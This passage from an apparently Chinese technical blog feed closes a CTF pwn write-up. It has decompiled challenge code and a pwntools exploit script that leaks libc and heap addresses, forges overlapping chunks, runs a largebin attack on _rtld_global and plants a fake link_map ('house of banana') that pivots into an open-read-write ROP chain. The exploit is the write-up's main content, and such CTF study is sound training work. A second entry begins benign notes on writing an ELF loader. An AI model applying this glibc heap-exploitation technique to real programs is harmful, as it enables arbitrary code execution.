class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( c[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        ++note[idx][p];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        note[idx][p] = getchar();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        --note[idx][p];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="built_in">putchar</span>(note[idx][p]);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( p &gt;= <span class="number">0</span> )</span><br><span class="line">          --p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          myprintf(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !note[idx][p] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            v3 = q++;</span><br><span class="line">          <span class="keyword">while</span> ( mem[v3] != <span class="number">93</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          --q;</span><br><span class="line">          v4 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( mem[q] != <span class="number">91</span> )</span><br><span class="line">            v4 = q &gt;= <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v4 );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nError code:%c\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)c[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p> 可以看到，由于程序实现的<strong>mymalloc</strong>中会清空<strong>tcache_struct</strong>结构中的数据，则我们基本上只能在<strong>unsorted bin</strong>、<strong>small bin</strong>和<strong>large bin</strong>中进行利用。<br> 由于<strong>edit</strong>函数的存在，则我们可以读取<strong>large bin</strong>中的相关信息，则可以非常轻松的获取<strong>堆地址</strong>和<strong>libc基址</strong>。<br> 由于<strong>main</strong>程序中存在<strong>return</strong>返回，则各项条件完美符合<strong>house_of_banana</strong>，因此通过伪造<strong>_rtld_global</strong>中的<strong>link_map</strong>结构，从而劫持程序执行流，执行<strong>orw</strong>链获取flag</p><h4 id="题解和关键说明"><a href="#题解和关键说明" class="headerlink" title="题解和关键说明"></a>题解和关键说明</h4><p>  首先，通过释放一个<strong>large bin</strong>范围的chunk，然后再申请一个更大的chunk，从而确保该chunk被插入到<strong>large bin</strong>相关的链上。此时如果申请同样大小的chunk，则会申请到释放在<strong>large bin</strong>中的chunk，其<strong>fd</strong>和<strong>bk</strong>字段都是<strong>main_arena + 1104</strong>，而其<strong>fd_nextsize</strong>和<strong>bk_nextsize</strong>字段的值就是当前chunk的地址。<br>  因此，通过<strong>edit</strong>函数，将0字段进行填充，在调用<strong>view</strong>，即可同时获取堆地址和libc基址，相关代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取chunk地址和libc地址</span></span><br><span class="line">wp_add(<span class="number">0x428</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">wp_add(<span class="number">0x428</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">wp_delete(<span class="number">0</span>)</span><br><span class="line">wp_add(<span class="number">0x438</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">wp_add(<span class="number">0x428</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x7</span>)<span class="comment">#2</span></span><br><span class="line">wp_edit(<span class="number">2</span>, <span class="string">&#x27;(&#x27;</span> * <span class="number">6</span> + <span class="string">&#x27;!(!(&#x27;</span> + <span class="string">&#x27;(&#x27;</span> * <span class="number">6</span> + <span class="string">&#x27;!(!\x00&#x27;</span>)</span><br><span class="line">wp_view(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span> * <span class="number">6</span> + <span class="string">&#x27;\x01\x01&#x27;</span>)</span><br><span class="line">lib_base = uu64(re(<span class="number">8</span>)[:-<span class="number">2</span>]) - <span class="number">0x7fdd1f358fd0</span> + <span class="number">0x7fdd1f16d000</span></span><br><span class="line">chunk_base = uu64(re(<span class="number">6</span>)) - <span class="number">0x000055e69bf0a2b0</span> + <span class="number">0x55e69bf0a000</span></span><br><span class="line">log.info(<span class="string">&#x27;lib_base =&gt; %#x&#x27;</span>%(lib_base))</span><br><span class="line">log.info(<span class="string">&#x27;chunk_base =&gt; %#x&#x27;</span>%(chunk_base))</span><br><span class="line">wp_delete(<span class="number">0</span>)</span><br><span class="line">wp_delete(<span class="number">1</span>)</span><br><span class="line">wp_delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>  其次，由于<strong>gift</strong>存在越界写，则通过覆写相邻的下一个chunk的size字段，即可构建重叠堆。在重叠堆上，我们就可以非常轻松的实现<strong>largebin attack</strong>，从而完成<strong>house_of_banana</strong>。<br>  类似于前面的过程，我们首先申请多个<strong>chunk</strong>，组成重叠堆的内存。其次，我们在最开始的chunk上执行<strong>gift</strong>，通过越界写修改下一个chunk的size大小，从而伪造了一个<strong>fake chunk</strong>，该<strong>fake chunk</strong>跨过了多个合法的chunk，从而构成了重叠堆，相关的代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构建重叠chunk</span></span><br><span class="line">wp_add(<span class="number">0x408</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x408</span>)<span class="comment">#0</span></span><br><span class="line">wp_add(<span class="number">0x428</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">wp_add(<span class="number">0x468</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">wp_add(<span class="number">0x408</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">wp_add(<span class="number">0x458</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">wp_add(<span class="number">0x408</span>, up64(<span class="number">0</span>) + up64(<span class="number">0x21</span>) + up64(<span class="number">0</span>) * <span class="number">2</span> + up64(<span class="number">0</span>) + up64(<span class="number">0x21</span>))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">fake_size = <span class="number">0x430</span> + <span class="number">0x470</span> + <span class="number">0x410</span> + <span class="number">0x460</span> + <span class="number">0x10</span></span><br><span class="line">wp_gift(<span class="number">0</span>, <span class="string">&#x27;[&gt;]&gt;,&gt;,\x00&#x27;</span>)</span><br><span class="line">se(<span class="built_in">chr</span>((fake_size &amp; <span class="number">0xff</span>) + <span class="number">1</span>) + <span class="built_in">chr</span>((fake_size &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))</span><br><span class="line">wp_delete(<span class="number">1</span>)</span><br><span class="line">wp_add(fake_size - <span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>  下面，则通过重叠堆，修改位于<strong>large bin</strong>中的最小大小的chunk的<strong>bk_nextsize</strong>字段为<strong>_rtld_global</strong>地址即可。然后位于重叠堆(方便写)通过释放和申请，插入到<strong>large bin</strong>中，从而完成相关的<strong>largebin attack</strong>。此时<strong>_rtld_global</strong>的第一个<strong>link_map</strong>指针的值指向了该释放的chunk，则我们向该chunk中写入伪造的<strong>link_map</strong>，即相当于在<strong>—_rtld_global</strong>结构中伪造了<strong>link_map</strong>，我们在<strong>link_map</strong>中通过伪造一个<strong>fini_array</strong>数组，其首先执行<strong>setcontext</strong>部分函数，将栈劫持到提前在伪造的<strong>link_map</strong>上插入的row链即可。相关的脚本代码如下所示，这里理论上应该遍历<strong>_rtld_global</strong>地址的，因为实际上其第2个字节可能不同(但是不会变化)，需要遍历可能的256中情况即可。<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largebin 攻击</span></span><br><span class="line">wp_delete(<span class="number">2</span>)</span><br><span class="line">wp_add(<span class="number">0x490</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">rtld_global = lib_base + <span class="number">0x7efece6cf060</span> - <span class="number">0x7efece499000</span></span><br><span class="line">log.info(<span class="string">&#x27;rtld_global =&gt; %#x&#x27;</span>%(rtld_global))</span><br><span class="line">wp_delete(<span class="number">1</span>)</span><br><span class="line">wp_add(fake_size - <span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x420</span> + up64(<span class="number">0</span>) + up64(<span class="number">0x471</span>) + up64(lib_base + <span class="number">0x10</span> + lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">1120</span>) + up64(lib_base + <span class="number">0x10</span> + lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">1120</span>) + up64(<span class="number">0</span>) + up64(rtld_global - <span class="number">0x20</span>) + <span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">wp_delete(<span class="number">4</span>)</span><br><span class="line">wp_add(<span class="number">0x490</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">fake_link_map_addr = chunk_base + <span class="number">0x000055de23bed370</span> - <span class="number">0x55de23bec000</span></span><br><span class="line">flag_address = fake_link_map_addr + <span class="number">100</span> * <span class="number">8</span></span><br><span class="line">stack_address = fake_link_map_addr + <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = lib_base + <span class="number">0x26b72</span></span><br><span class="line">ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">pop_rsi_ret = lib_base + <span class="number">0x27529</span></span><br><span class="line">pop_rdx_r12_ret = lib_base + <span class="number">0x11c36f</span></span><br><span class="line">syscall_ret = lib_base + <span class="number">0x66229</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += up64(pop_rdi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(<span class="number">4</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += up64(pop_rdi_ret) + up64(<span class="number">3</span>)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rdx_r12_ret) + up64(<span class="number">14</span> * <span class="number">8</span>) + up64(<span class="number">0</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += up64(pop_rdi_ret) + up64(<span class="number">1</span>)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rdx_r12_ret) + up64(<span class="number">14</span> * <span class="number">8</span>) + up64(<span class="number">0</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">link_map &#123;</span></span><br><span class="line"><span class="string">l_addr = 0offset: 0 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_next = (char*)fake_link_map_addr + 7 * 8 - 3 * 8offset: 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_real = &amp;link_mapoffset: 5 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_next_2:offset: 7 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 8 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_next_3:offset: 8 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 13 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_real_2:offset: 9 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 7 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_real_3:offset: 10 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 8 * 8 - 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_next_4:offset: 13 * 8</span></span><br><span class="line"><span class="string">null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_real_4:offset: 15 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 13 * 8 - 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_info[26]offset: 34 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 37 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_info[28]offset: 36 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 39 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_array:offset: 38 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 52 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_arraysize:offset: 40 * 8</span></span><br><span class="line"><span class="string">8 * 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_array:offset: 52 * 8</span></span><br><span class="line"><span class="string">lib_base + lib.sym[&#x27;setcontext&#x27;] + 61</span></span><br><span class="line"><span class="string">lib_base + ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_rdi:offset: 66 * 8</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">setcontext_rsi:offset: 67 * 8</span></span><br><span class="line"><span class="string">stack_address</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_rdx:offset: 70 * 8</span></span><br><span class="line"><span class="string">len(rop)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_stack:offset: 73 * 8</span></span><br><span class="line"><span class="string">stack_address</span></span><br><span class="line"><span class="string">setcontext_retn:offset: 74 * 8</span></span><br><span class="line"><span class="string">lib_base + lib.sym[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_init_called = 0x800000000offset: 99 * 8</span></span><br><span class="line"><span class="string">flag:offset: 100 * 8</span></span><br><span class="line"><span class="string">&#x27;flag\x00&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fake_link_map = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">3</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">7</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#l_next</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">5</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr)<span class="comment">#l_real</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">7</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">8</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_next_2</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">13</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_next_3</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">7</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_2</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">8</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_3</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">13</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0</span>)<span class="comment">#fake_l_next_4</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">15</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">13</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_4</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">34</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">37</span> * <span class="number">8</span>)<span class="comment">#l_info[26]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">36</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">39</span> * <span class="number">8</span>)<span class="comment">#l_info[26]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">38</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">52</span> * <span class="number">8</span>)<span class="comment">#fini_array</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">40</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">8</span> * <span class="number">2</span>)<span class="comment">#fini_arraysize</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">52</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(lib_base + lib.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + up64(ret)<span class="comment">#fini_array</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">66</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0</span>)<span class="comment">#setcontext_rdi</span></span><br><span class="line">fake_link_map += up64(stack_address)<span class="comment">#setcontext_rsi</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">70</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="built_in">len</span>(rop))<span class="comment">#setcontext_rdx</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">73</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(stack_address)<span class="comment">#setcontext_stack</span></span><br><span class="line">fake_link_map += up64(lib_base + lib.sym[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#setcontext_retn</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">99</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0x800000000</span>)<span class="comment">#l_init_called</span></span><br><span class="line">fake_link_map += <span class="string">&#x27;flag\x00&#x27;</span><span class="comment">#flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wp_delete(<span class="number">1</span>)</span><br><span class="line">wp_add(fake_size - <span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x420</span> + <span class="number">0x470</span> + <span class="number">0x410</span>) + fake_link_map)<span class="comment">#1</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(rop)</span><br><span class="line">log.info(ru(<span class="string">&#x27;&#125;&#x27;</span>).split()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-六</title>
      <link href="/2021/10/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%85%AD/"/>
      <url>/2021/10/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  最近太忙了，以至于<strong>操作系统-设计与实现</strong>和博客都没怎么更新过了…趁着国庆假期，把其他杂事都干完了，终于有时间来填坑了！</p><p>  首先总结一下最近的课程内容，然后实现L2。</p><h2 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h2><p>  对于计算机科学来说，其实际上就是一个由各种手册(标准)组成的学科。因此学习的最好方法就是<strong>RTFM</strong>, <em>Read The Friendly Manual</em>。<br>  如果想要对于Linux下的各种文件格式约定、内存布局等有更深入的了解，可以阅读<a href="sysv-abi.pdf">System V ABI手册</a></p><h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>  这里复现一下jyy老师在课程中给出的加载器demo</p><h3 id="静态链接程序的加载"><a href="#静态链接程序的加载" class="headerlink" title="静态链接程序的加载"></a>静态链接程序的加载</h3><p>  对于静态链接的程序，其加载起来非常简单：由于二进制文件中已经包含了程序运行所需要的全部代码和数据，因此理论上，只需要通过<strong>mmap</strong>，将其映射入内存中，然后将执行流转交给程序入口即可。<br>  虽然如此，静态链接程序的加载器实际上坑也不少</p><ol><li>要进行一些额外的设置(栈的初始化，部分寄存器初始化等)，从而使其符合Linux进程初始化的约定——具体可以查看<a href="sysv-abi.pdf">System V ABI手册</a>的<strong>Process Initialization</strong>章节。</li><li><strong>Auxiliary Vector</strong>必须初始化，并且其必须包含<strong>AT_RANDOM</strong>类型的数据——因为<strong>glibc</strong>库的<strong>__libc_start_main</strong>会访问<code>_dl_random</code>所指向的地址，而这依赖<strong>Auxiliary Vector</strong>的<strong>AT_RANDOM</strong>类型的数据。另一方面，也不要将当前加载器的<strong>Auxiliary Vector</strong>直接当做待加载程序的<strong>Auxiliary Vector</strong>，部分加载器的<strong>Auxiliary Vector</strong>设置的值会导致待加载程序崩溃。具体的<strong>Auxiliary Vector</strong>在<a href="sysv-abi.pdf">System V ABI手册</a>中有较为详细的说明。<del>这个坑藏的太深了</del></li><li>将可执行文件映射入内存时，实际上只需要将<strong>Program Header</strong>的类型为<strong>PT_LOAD</strong>的<strong>segment</strong>载入内存即可</li><li>通过<strong>mmap</strong>将可执行文件映射入内存的时候<ul><li>如果<strong>flags</strong>参数没有设置<strong>MAP_FIXED</strong>，则<strong>addr</strong>参数仅仅被当做参考</li><li><strong>addr</strong>参数、<strong>offset</strong>参数应该对齐到<strong>sysconf(_SC_PAGE_SIZE)</strong></li></ul></li><li>将每个<strong>segment</strong>通过<strong>mmap</strong>映射的时候，<strong>mmap</strong>函数的<strong>prot</strong>参数根据<strong>segment</strong>的<strong>p_flags</strong>字段判定；<strong>mmap</strong>函数的<strong>flags</strong>参数设置为<code>MAP_PRIVATE | MAP_FIXED</code>，从而确保<strong>mmap</strong>的地址为指定的虚拟地址；<strong>mmap</strong>函数的<strong>addr</strong>参数和<strong>offset</strong>参数，是根据<strong>segment</strong>的<strong>p_vaddr</strong>字段和<strong>p_offset</strong>字段对齐<strong>p_align</strong>字段产生的:这里如果<strong>segment</strong>的<strong>p_vaddr</strong>字段和<strong>p_offset</strong>字段如果对齐<strong>p_align</strong>字段的话，其也自动对齐了<strong>sysconf(_SC_PAGE_SIZE)</strong></li><li>将<strong>segment</strong>通过<strong>mmap</strong>映射入内存时，映射的长度选择<strong>segment</strong>的<strong>p_memsz</strong>字段，其包含<strong>p_filesz</strong>大小的实际文件内容，以及部分<strong>bss</strong>数据。因此通过<strong>mmap</strong>映射完后，还需要将偏移从<strong>p_filesz</strong>到<strong>p_memsz</strong>的内存空间清零，作为<strong>bss</strong>部分的数据空间</li><li><p>将进程的栈空间稍微开大点，否则会爆栈<del>一开始我以为4KB就足够了，结果还是太年轻</del></p><p>最后，复现的、不那么优雅的静态链接程序的加载器的demo如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 